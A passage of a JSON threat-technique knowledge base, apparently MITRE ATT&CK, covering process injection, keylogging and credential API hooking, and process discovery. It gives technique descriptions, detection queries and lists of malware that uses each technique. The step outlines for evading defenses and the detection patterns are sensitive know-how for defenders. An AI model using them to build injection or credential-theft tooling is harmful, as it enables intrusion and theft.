    "Description": "Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.[1]To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.[2]To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.[3]Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.[4]Adversaries may abuse TxF to a perform a file-less variation ofProcess Injection. Similar toProcess Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such asNtUnmapViewOfSection,VirtualProtectEx, andSetThreadContext.[4]Process Doppelgänging is implemented in 4 steps[4]:Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.Load – Create a shared section of memory and load the malicious executable.Rollback – Undo changes to original executable, effectively removing malicious code from the file system.Animate – Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Scan file objects reported during the PsSetCreateProcessNotifyRoutine,[10]which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access.[4]Also consider comparing file objects loaded in memory to the corresponding file on disk.[11]",
      "Monitor and analyze calls toCreateTransaction,CreateFileTransacted,RollbackTransaction, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls toNtCreateProcessExandNtCreateThreadExas well as API calls used to modify memory within another process, such asWriteProcessMemory.[4][11]"
    ],
    "Procedure Examples": [
      "Bazarcan inject into a target process using process doppelgänging.[5][6]",
      "Leafminerhas usedProcess Doppelgängingto evade security software while deploying tools on compromised systems.[7]",
      "SynAckabuses NTFS transactions to launch and conceal malicious processes.[8][9]"
    ]
  },
  "T1055.014": {
    "Name": "Process Injection:VDSO Hijacking",
    "Description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process viaPtrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).[1][2][3][4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitor library load events, especially unusual creation of these binary files followed by loading into processes. Look for libraries that are not recognized or not normally loaded into a process.",
      "Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.[5][6][7][8]"
    ],
    "Procedure Examples": [
      "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."
    ]
  },
  "T1055.015": {
    "Name": "Process Injection:ListPlanting",
    "Description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.[1]Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.List-view controls are user interface windows used to display collections of items.[2]Information about an application's list-view settings are stored within the process' memory in aSysListView32control.ListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.[3]Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to theSysListView32child of the victim process window (via Windows API calls such asFindWindowand/orEnumWindows) or otherProcess Injectionmethods.Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitoredWriteProcessMemoryfunction. For example, an adversary can use thePostMessageand/orSendMessageAPI functions to sendLVM_SETITEMPOSITIONandLVM_GETITEMPOSITIONmessages, effectively copying a payload 2 bytes at a time to the allocated memory.[4]Finally, the payload is triggered by sending theLVM_SORTITEMSmessage to theSysListView32child of the process window, with the payload within the newly allocated buffer passed and executed as theListView_SortItemscallback.",
    "Detects": [
      "Consider monitoring for excessive use ofSendMessageand/orPostMessageAPI functions withLVM_SETITEMPOSITIONand/orLVM_GETITEMPOSITIONarguments.Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asFindWindow,FindWindowEx,EnumWindows,EnumChildWindows, and those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be abused for this technique.",
      "Monitor for changes made to processes that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Analyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior."
    ],
    "Procedure Examples": [
      "InvisiMolehas used ListPlanting to inject code into a trusted process.[4]"
    ]
  },
  "T1056": {
    "Name": "Input Capture",
    "Description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g.Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g.Web Portal Capture).",
    "Detects": [
      "Monitor executed commands and arguments associated with modifications to variables and files associated with loading shared libraries such asLD_PRELOADon Linux andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor for unusual kernel driver installation activity.Analytic 1 - Unexpected kernel driver installations.index=security sourcetype=\"WinEventLog:System\" EventCode=7045 | where match(Service_Name, \"(?i)(keylogger|input|capture|sniff|monitor|keyboard|logger|driver)\")",
      "Monitor for newly constructed files that are added to absolute paths of shared libraries such asLD_PRELOADon Linux (such as/etc/ld.so.preload) andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor for changes made to files for unexpected modifications to access permissions and attributes. Monitor for changes to files associated with loading shared libraries such asLD_PRELOADon Linux (such as/etc/ld.so.preload) andDYLD_INSERT_LIBRARIESon macOS.Analytic 1 - Unexpected file modifications.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 | where Object_Type=\"File\" AND Access_Mask IN (\"0x2\", \"0x4\", \"0x20\", \"0x80\", \"0x100\")",
      "Monitor library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
      "Monitor for API calls toSetWindowsHook,GetKeyState, andGetAsyncKeyState.[12]",
      "Monitor for newly executed processes conducting malicious activity",
      "Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow.",
      "Monitor for changes made to windows registry keys or values for unexpected modifications"
    ],
    "Procedure Examples": [
      "APT39has utilized tools to capture mouse movements.[1]",
      "APT42has used credential harvesting websites.[2]",
      "Chaeshas a module to perform any API hooking it desires.[3]",
      "FlawedAmmyycan collect mouse events.[4]",
      "Kobaloshas used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host.[5][6]",
      "Leviathancaptured submitted multfactor authentication codes and other technical artifacts related to remote access sessions duringLeviathan Australian Intrusions.[7]",
      "Mafaldacan conduct mouse event logging.[8]",
      "metaMaincan log mouse events.[8]",
      "NPPSPYcaptures user input into the Winlogon process by redirecting RPC traffic from legitimate listening DLLs within the operating system to a newly registered malicious item that allows for recording logon information in cleartext.[9]",
      "Storm-1811has used a PowerShell script to capture user credentials after prompting a user to authenticate to run a malicious script masquerading as a legitimate update item.[10]",
      "Versa Director Zero Day Exploitationintercepted and harvested credentials from user logins to compromised devices.[11]"
    ]
  },
  "T1056.001": {
    "Name": "Input Capture:Keylogging",
    "Description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities whenOS Credential Dumpingefforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.[1]Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.[2]Some methods include:Hooking API callbacks used for processing keystrokes. UnlikeCredential API Hooking, this focuses solely on API functions intended for processing keystroke data.Reading raw keystroke data from the hardware buffer.Windows Registry modifications.Custom drivers.Modify System Imagemay provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.[3]",
    "Detects": [
      "Monitor for unusual kernel driver installation activity",
      "Monitor for API calls to the SetWindowsHook, GetKeyState, and GetAsyncKeyState.[2]and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.",
      "Monitor for changes made to windows registry keys or values for unexpected modifications"
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teamgathered account credentials via aBlackEnergykeylogger plugin.[4][5]",
      "ADVSTORESHELLcan perform keylogging.[6][7]",
      "Agent Teslacan log keystrokes on the victim’s machine.[8][9][10][11][12]",
      "Ajax Security Teamhas used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system.[13]",
      "AppleSeedcan useGetKeyStateandGetKeyboardStateto capture keystrokes on the victim’s machine.[14][15]",
      "APT28has used tools to perform keylogging.[16][17][18]",
      "APT3has used a keylogging tool that records keystrokes in encrypted files.[19]",
      "APT32has abused the PasswordChangeNotify to monitor for and capture account password changes.[20]",
      "APT38used a Trojan called KEYLIME to capture keystrokes from the victim’s machine.[21]",
      "APT39has used tools for capturing keystrokes.[22][23]",
      "APT41used a keylogger called GEARSHIFT on a target system.[24]",
      "APT42has used custom malware to log keystrokes.[25]",
      "APT5has used malware with keylogging capabilities to monitor the communications of targeted entities.[26][27]",
      "Astarothlogs keystrokes from the victim's machine.[28]",
      "AsyncRATcan capture keystrokes on the victim’s machine.[29]",
      "One ofAttor's plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process.[30]",
      "BabySharkhas aPowerShell-based remote administration ability that can implement a PowerShell or C# based keylogger.[31]",
      "When it first starts,BADNEWSspawns a new thread to log keystrokes.[32][33][34]",
      "BadPatchhas a keylogging capability.[35]",
      "Bandookcontains keylogging capabilities.[36]",
      "BISCUITcan capture keystrokes.[37]",
      "BlackEnergyhas run a keylogger plug-in on a victim.[38]",
      "Cadelspyhas the ability to log keystrokes on the compromised host.[39]",
      "Carbanaklogs key strokes for configured processes and sends them back to the C2 server.[40][41]",
      "Cardinal RATcan log keystrokes.[42]",
      "Catchamascollects keystrokes from the victim’s machine.[43]",
      "CHIMNEYSWEEPhas the ability to support keylogging.[44]",
      "CHOPSTICKis capable of performing keylogging.[45][6][17]",
      "Clamblingcan capture keystrokes on a compromised host.[46][47]",
      "Cobalt Strikecan track key presses with a keylogger module.[48][49][50]",
      "Cobian RAThas a feature to perform keylogging on the victim’s machine.[51]",
      "CosmicDukeuses a keylogger.[52]",
      "Crimsoncan use a module to perform keylogging on compromised hosts.[53][54][55]",
      "Cubalogs keystrokes via polling by usingGetKeyStateandVkKeyScanfunctions.[56]",
      "DuringCutting Edge, threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials.[57]",
      "DarkComethas a keylogging capability.[58]",
      "DarkGatewill spawn a thread on execution to capture all keyboard events and write them to a predefined log file.[59][60]",
      "Darkhotelhas used a keylogger.[61]",
      "DarkTortillacan download a keylogging module.[62]",
      "DarkWatchmancan track key presses with a keylogger module.[63]",
      "Daserfcan log keystrokes.[64][65]",
      "Derusbiis capable of logging keystrokes.[66]",
      "DOGCALLis capable of logging keystrokes.[67][68]",
      "Dtrack’s dropper contains a keylogging executable.[69]",
      "Duqucan track key presses with a keylogger module.[70]",
      "DUSTTRAPcan perform keylogging operations.[71]",
      "DustySkycontains a keylogger.[72]",
      "ECCENTRICBANDWAGONcan capture and store keystrokes.[73]",
      "Empireincludes keylogging capabilities for Windows, Linux, and macOS systems.[74]",
      "EvilGrabhas the capability to capture keystrokes.[75]",
      "Explosivehas leveraged its keylogging capabilities to gain access to administrator accounts on target servers.[76][77]",
      "FakeMcontains a keylogger module.[78]",
      "FIN13has logged the keystrokes of victims to escalate privileges.[79]",
      "FIN4has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger.[80][81]",
      "FlawedAmmyycan collect keyboard events.[82]",
      "TheFunnyDreamKeyrecord component can capture keystrokes.[83]",
      "Fysbiscan perform keylogging.[84]",
      "gh0st RAThas a keylogger.[85][86]",
      "Grandoreirocan log keystrokes on the victim's machine.[87]",
      "GreyEnergyhas a module to harvest pressed keystrokes.[88]",
      "Malware used byGroup5is capable of capturing keystrokes.[89]",
      "The executable version ofHelminthhas a module to log keystrokes.[90]",
      "HEXANEhas used a PowerShell-based keylogger namedkl.ps1.[91][92]",
      "HTTPBrowseris capable of capturing keystrokes on victims.[93]",
      "Imminent Monitorhas a keylogging module.[94]",
      "InvisiMolecan capture keystrokes on a compromised host.[95]",
      "JPINcontains a custom keylogger.[96]",
      "jRAThas the capability to log keystrokes from the victim’s machine, both offline and online.[97][98]",
      "Kasidethas the ability to initiate keylogging.[99]",
      "Ke3changhas used keyloggers.[100][101]",
      "KeyBoyinstalls a keylogger for intercepting credentials and keystrokes.[102]",
      "KGH_SPYcan perform keylogging by polling theGetAsyncKeyState()function.[103]",
      "Kimsukyhas used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.[104][105][106][107][1][15]",
      "Kivarshas the ability to initiate keylogging on the infected host.[108]",
      "KONNIhas the capability to perform keylogging.[109]",
      "Lazarus Groupmalware KiloAlfa contains keylogging functionality.[110][111]",
      "Lokibothas the ability to capture input on the compromised host via keylogging.[112]",
      "Machetelogs keystrokes from the victim’s machine.[113][114][115][116]",
      "MacMacan use Core Graphics Event Taps to intercept user keystrokes from any text input field and saves them to text files. Text input fields include Spotlight, Finder, Safari, Mail, Messages, and other apps that have text fields for passwords.[117][118]",
      "MacSpycaptures keystrokes.[119]",
      "Magic Houndmalware is capable of keylogging.[120]",
      "MarkiRATcan capture all keystrokes on a compromised host.[121]",
      "Matryoshkais capable of keylogging.[122][123]",
      "menuPasshas used key loggers to steal usernames and passwords.[124]",
      "metaMainhas the ability to log keyboard events.[125][126]",
      "Metamorfohas a command to launch a keylogger and capture keystrokes on the victim’s machine.[127][128]",
      "MgBotincludes keylogger payloads focused on the QQ chat application.[129][130]",
      "Micropsiahas keylogging capabilities.[131]",
      "Mispaducan log keystrokes on the victim's machine.[132][133][134]",
      "MoonWindhas a keylogger.[135]",
      "NanoCorecan perform keylogging on the victim’s machine.[136]",
      "NavRATlogs the keystrokes on the targeted system.[137]",
      "NetTravelercontains a keylogger.[138]",
      "NETWIREcan perform keylogging.[139][140][141][142][143]",
      "NightClubcan use a plugin for keylogging.[144]",
      "njRATis capable of logging keystrokes.[145][146][89]",
      "OilRighas employed keyloggers including KEYPUNCH and LONGWATCH.[147][148][149]",
      "Okrumwas seen using a keylogger tool to capture keystrokes.[150]",
      "DuringOperation Wocao, threat actors obtained the password for the victim's password manager via a custom keylogger.[151]",
      "OwaAuthcaptures and DES-encrypts credentials before writing the username and password to a log file,C:\\log.txt.[93]",
      "PcSharehas the ability to capture keystrokes.[83]",
      "Peppycan log keystrokes on compromised hosts.[53]",
      "PLATINUMhas used several different keyloggers.[96]",
      "PlugXhas a module for capturing keystrokes per process including window titles.[152]",
      "PoetRAThas used a Python tool named klog.exe for keylogging.[153]",
      "PoisonIvycontains a keylogger.[154][155]",
      "PoshC2has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.[156]",
      "PowerLesscan use a module to log keystrokes.[157]",
      "PowerSploit'sGet-KeystrokesExfiltration module can log keystrokes.[158][159]",
      "Prikormkacontains a keylogger module that collects keystrokes and the titles of foreground windows.[160]",
      "Protonuses a keylogger to capture keystrokes.[119]",
      "Pupyuses a keylogger to capture keystrokes it then sends back to the server after it is stopped.[161]",
      "QakBotcan capture keystrokes on a compromised host.[162][163][164]",
      "QuasarRAThas a built-in keylogger.[165][166]",
      "RCSessionhas the ability to capture keystrokes on a compromised host.[46][167]",
      "Regincontains a keylogger.[168]",
      "Remcoshas a command for keylogging.[169][170]",
      "Remexigathers and exfiltrates keystrokes from the machine.[171]",
      "Remseccontains a keylogger component.[172][173]",
      "Revenge RAThas a plugin for keylogging.[174][175]",
      "ROKRATcan useSetWindowsHookExandGetKeyNameTextto capture keystrokes.[176][177]",
      "Roverhas keylogging functionality.[178]",
      "RTMcan record keystrokes from both the keyboard and virtual keyboard.[179][180]",
      "RunningRATcaptures keystrokes and sends them back to the C2 server.[181]",
      "Sandworm Teamhas used a keylogger to capture keystrokes by using the SetWindowsHookEx function.[182]",
      "SILENTTRINITYhas a keylogging capability.[183]",
      "SLOTHFULMEDIAhas a keylogging capability.[184]",
      "SMOKEDHAMcan continuously capture keystrokes.[185][186]",
      "Sowbughas used keylogging tools.[187]",
      "SslMMcreates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.[188]",
      "Sykipotcontains keylogging functionality to steal passwords.[189]",
      "TajMahalhas the ability to capture keystrokes on an infected host.[190]",
      "ThiefQuestuses theCGEventTapfunctions to perform keylogging.[191]",
      "Threat Group-3390actors installed a credential logger on Microsoft Exchange servers.Threat Group-3390also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.[93][192][193]",
      "TinyZBotcontains keylogger functionality.[194]",
      "Tonto Teamhas used keylogging tools in their operations.[195]",
      "Trojan.Karaganycan capture keystrokes on a compromised host.[196]",
      "Unknown Loggeris capable of recording keystrokes.[32]",
      "VERMINcollects keystrokes from the victim machine.[197]",
      "Volt Typhoonhas created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution.[198]",
      "WarzoneRAThas the capability to install a live and offline keylogger, including through the use of theGetAsyncKeyStateWindows API.[199][200]",
      "XAgentOSXcontains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.[201]",
      "XLoadercan capture keystrokes from the victim machine.[202]",
      "ytyuses a keylogger plugin to gather keystrokes.[203]",
      "Zeus Pandacan perform keylogging on the victim’s machine by hooking the functions TranslateMessage and WM_KEYDOWN.[204]",
      "ZxShellhas a feature to capture a remote computer's keystrokes using a keylogger.[24][205]"
    ]
  },
  "T1056.002": {
    "Name": "Input Capture:GUI Input Capture",
    "Description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex:Bypass User Account Control).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.[1]This type of prompt can be used to collect credentials via various languages such asAppleScript[2][3][4]andPowerShell.[2][5][4]On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e.Unix Shell).[4]Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e.,Browser Information Discoveryand/orApplication Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.",
    "Detects": [
      "Monitor executed commands and arguments, such as requests for credentials and/or strings related to creating password prompts that may be malicious.[4]",
      "Monitor for newly executed processes",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "Bundloreprompts the user for their credentials.[6]",
      "Calistopresents an input prompt asking for the user's login and password.[7]",
      "Cuckoo Stealerhas captured passwords by prompting victims with a \"macOS needs to access System Settings\" GUI window.[8]",
      "Dokprompts the user for credentials.[9]",
      "FIN4has presented victims with spoofed Windows Authentication prompts to collect their credentials.[10][11]",
      "iKittenprompts the user for their credentials.[9]",
      "Keydnapprompts the users for credentials.[12]",
      "Metamorfohas displayed fake forms on top of banking sites to intercept credentials from victims.[13]",
      "Mispaducan monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.[14][15]",
      "Protonprompts users for their credentials.[9]",
      "RedCurlprompts the user for credentials through a Microsoft Outlook pop-up.[16][17]",
      "SILENTTRINITY'scredphisher.pymodule can prompt a current user for their credentials.[18]",
      "XCSSETprompts the user to input credentials using a native macOS dialog box leveraging the system process/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment.[19]"
    ]
  },
  "T1056.003": {
    "Name": "Input Capture:Web Portal Capture",
    "Description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access throughExternal Remote ServicesandValid Accountsor as part of the initial compromise by exploitation of the externally facing web service.[1]",
    "Detects": [
      "Monitor for changes made to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content."
    ],
    "Procedure Examples": [
      "DuringCutting Edge, threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered.[2]",
      "TheIceAppleOWA credential logger can monitor for OWA authentication requests and log the credentials.[3]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velescaptured credentials as they were being changed by redirecting text-based login codes to websites they controlled.[4]",
      "WARPWIREcan capture credentials submitted during the web logon process in order to access layer seven applications such as RDP.[5]",
      "Winter Vivernregistered and hosted domains to allow for creation of web pages mimicking legitimate government email logon sites to collect logon information.[6]"
    ]
  },
  "T1056.004": {
    "Name": "Input Capture:Credential API Hooking",
    "Description": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.[1]UnlikeKeylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials.In Windows, hooking involves redirecting calls to these functions and can be implemented via:Hooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.[2][3]Import address table (IAT) hooking, which use modifications to a process’s IAT, where pointers to imported API functions are stored.[3][4][5]Inline hooking, which overwrites the first bytes in an API function to redirect code flow.[3][6][5]In Linux and macOS, adversaries may hook into system functions via theLD_PRELOAD(Linux) orDYLD_INSERT_LIBRARIES(macOS) environment variables, which enables loading shared libraries into a program’s address space. For example, an adversary may capture credentials by hooking into thelibc readfunction leveraged by SSH or SCP.[7]",
    "Detects": [
      "Monitor executed commands and arguments associated with modifications to variables and files associated with loading shared libraries such asLD_PRELOADon Linux andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor for newly constructed files that are added to absolute paths of shared libraries such asLD_PRELOADon Linux (such as/etc/ld.so.preload) andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor for changes to files associated with loading shared libraries such asLD_PRELOADon Linux (such as/etc/ld.so.preload) andDYLD_INSERT_LIBRARIESon macOS.",
      "Monitor library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
      "Monitor for API calls to theSetWindowsHookExandSetWinEventHookfunctions, which install a hook procedure.[2][20]Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools[20][21][22]or by programmatically examining internal kernel structures.[23][24]",
      "Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow."
    ],
    "Procedure Examples": [
      "Carberphas hooked several Windows API functions to steal credentials.[8]",
      "Empirecontains some modules that leverage API hooking to carry out tasks, such as netripper.[9]",
      "FinFisherhooks processes by modifying IAT pointers to CreateWindowEx.[10][3]",
      "NOKKIuses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine.[11]",
      "PLATINUMis capable of using Windows hook interfaces for information gathering such as credential access.[12]",
      "RDFSNIFFERhooks several Win32 API functions to hijack elements of the remote system management user-interface.[13]",
      "TrickBothas the ability to capture RDP credentials by capturing theCredEnumerateAAPI[14]",
      "Ursnifhas hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers.[15]",
      "VersaMemhooked and overrided Versa's built-in authentication method,setUserPassword, to intercept plaintext credentials when submitted to the server.[16]",
      "Zebrocyinstalls an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method.[17]",
      "Zeus Pandahooks processes by leveraging its own IAT hooked functions.[18]",
      "ZxShellhooks several API functions to spawn system threads.[19]"
    ]
  },
  "T1057": {
    "Name": "Process Discovery",
    "Description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information fromProcess Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using theTasklistutility viacmdorGet-ProcessviaPowerShell. Information about processes can also be extracted from the output ofNative APIcalls such asCreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with thepscommand. Adversaries may also opt to enumerate processes via/proc. ESXi also supports use of thepscommand, as well asesxcli system process list.[1][2]On network devices,Network Device CLIcommands such asshow processescan be used to display current running processes.[3][4]",
    "Detects": [
      "Monitor executed commands and arguments for actions that may attempt to get information about running processes on a system.",
      "Monitor for API calls may attempt to get information about running processes on a system.",
      "Monitor for newly executed processes that may attempt to get information about running processes on a system. To be effective in deciphering malicious and benign activity, the full command line is essential. Similarly, having information about the parent process can help with making decisions and tuning to an environment.Because these commands are built in, they may be run frequently by power users or even by normal users. Thus, an analytic looking at this information should have well-defined white- or blacklists, and should consider looking at an anomaly detection approach, so that this information can be learned dynamically.Within the built-in Windows Commands:hostnameipconfignetquserqwinstasc with flags query, queryex, qcsysteminfotasklistdsquerywhoamiNote: To be effective in deciphering malicious and benign activity, the full command line is essential. Similarly, having information about the parent process can help with making decisions and tuning to an environment.Analytic 1 - Host Discovery Commands(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (Image=\"C:\\Windows\\\\hostname.exe\" OR Image=\"C:\\Windows\\\\ipconfig.exe\" OR Image=\"C:\\Windows\\\\net.exe\" OR Image=\"C:\\Windows\\\\quser.exe\" OR Image=\"C:\\Windows\\\\qwinsta.exe\" OR (Image=\"C:\\Windows\\\\sc.exe\" AND (CommandLine=\"query\" OR CommandLine=\"qc\")) OR Image=\"C:\\Windows\\\\systeminfo.exe\" OR Image=\"C:\\Windows\\\\tasklist.exe\" OR Image=\"C:\\Windows\\*\\whoami.exe\")|stats values(Image) as \"Images\" values(CommandLine) as \"Command Lines\" by ComputerName"
    ],
    "Procedure Examples": [
      "4H RAThas the capability to obtain a listing of running processes (including loaded modules).[5]",
      "ADVSTORESHELLcan list running processes.[6]",
      "Agent Teslacan list the current running processes on the system.[7]",
      "Akiraverifies the deletion of volume shadow copies by checking for the existence of the process ID related to the process created to delete these items.[8]",
      "Andarielhas usedtasklistto enumerate processes and find a specific string.[9]",
      "Apostleretrieves a list of all running processes on a victim host, and stops all services containing the string \"sql,\" likely to propagate ransomware activity to database files.[10]",
      "AppleSeedcan enumerate the current process on a compromised host.[11]",
      "APT1gathered a list of running processes on the system usingtasklist /v.[12]",
      "AnAPT28loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[13]",
      "APT3has a tool that can list out currently running processes.[14][15]",
      "APT37's Freenki malware lists running processes using the Microsoft Windows API.[16]",
      "APT38leveraged Sysmon to understand the processes, services in the organization.[17]",
      "APT5has used Windows-based utilities to carry out tasks including tasklist.exe.[18]",
      "Aria-bodyhas the ability to enumerate loaded modules for a process.[19].",
      "Astarothsearches for different processes on the system.[20]",
      "AsyncRATcan examine running processes to determine if a debugger is present.[21]",
      "Avaddonhas collected information about running processes.[22]",
      "Avengerhas the ability to useTasklistto identify running processes.[23]",
      "AvosLockerhas discovered system processes by callingRmGetList.[24]",
      "Azorultcan collect a list of running processes by calling CreateToolhelp32Snapshot.[25][26]",
      "Babukhas the ability to check running processes on a targeted system.[27][28][29]",
      "BabySharkhas executed thetasklistcommand.[30]",
      "Backdoor.Oldreacollects information about running processes.[31]",
      "BACKSPACEmay collect information about running processes.[32]",
      "Bad Rabbitcan enumerate all running processes to compare hashes.[33]",
      "BADHATCHcan retrieve a list of running processes from a compromised machine.[34]",
      "Bankshotidentifies processes and collects the process ids.[35]",
      "Bazarcan identity the current process on a compromised host.[36]",
      "BBSRATcan list running processes.[37]",
      "BISCUIThas a command to enumerate running processes and identify their owners.[38]",
      "Bisonalcan obtain a list of running processes on the victim’s machine.[39][40][41]",
      "BLACKCOFFEEhas the capability to discover processes.[42]",
      "BlackEnergyhas gathered a process list by usingTasklist.exe.[43][44][45]",
      "BLUELIGHTcan collect process filenames and SID authority level.[46]",
      "Bonadancan use thepscommand to discover other cryptocurrency miners active on the system.[47]",
      "Brave Princelists the running processes.[48]",
      "Brute Ratel C4can enumerate all processes and locate specific process IDs (PIDs).[49]",
      "Bumblebeecan identify processes associated with analytical tools.[50][51][52]",
      "Bundlorehas used thepscommand to list processes.[53]",
      "DuringC0015, the threat actors used thetasklist /scommand as well astaskmanagerto obtain a list of running processes.[54]",
      "CaddyWipercan obtain a list of current processes.[55]",
      "Cannoncan obtain a list of processes running on the system.[56][57]",
      "Carbanaklists running processes.[58]",
      "Carberphas collected a list of running processes.[59]",
